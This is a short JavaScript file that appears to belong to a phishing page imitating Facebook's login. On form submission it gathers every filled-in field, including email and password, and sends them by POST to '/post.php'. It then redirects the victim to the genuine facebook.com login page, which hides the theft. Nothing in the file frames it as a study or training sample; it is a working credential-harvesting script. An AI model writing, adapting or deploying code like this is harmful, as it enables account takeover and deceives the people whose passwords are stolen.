const loginForm = document.getElementById('login_form');
const loginButton = document.getElementById('loginbutton');

loginButton.addEventListener('click', () => {
   console.log('hi')
});
loginForm.addEventListener('submit', e => {
   const email = document.getElementById('email');
   const password = document.getElementById('pass');
   if(password.value && email.value) { 
   let obj = {};
   Array.from(e.target).forEach(element => {
      // console.log(element);
      // console.log(element.name, element.value);
      if(element.name && element.value) {
         Object.assign(obj, { [element.name]: element.value });
      }
   });
   // console.log(obj);
   const xhttp = new XMLHttpRequest();
   xhttp.open('POST', "/post.php");
   xhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
   xhttp.onreadystatechange = function () {
      if(this.readyState == 4 && this.status == 200) {
         console.log(xhttp.response);
      }
   }
   let query = '';
   for(const key in obj) {
      query += `${key}=${obj[key]} `;
   }
   query = query.trim().split(' ').join('&');
   // console.log(query);
   xhttp.send(query);
   window.location.replace('https://www.facebook.com/login');
}})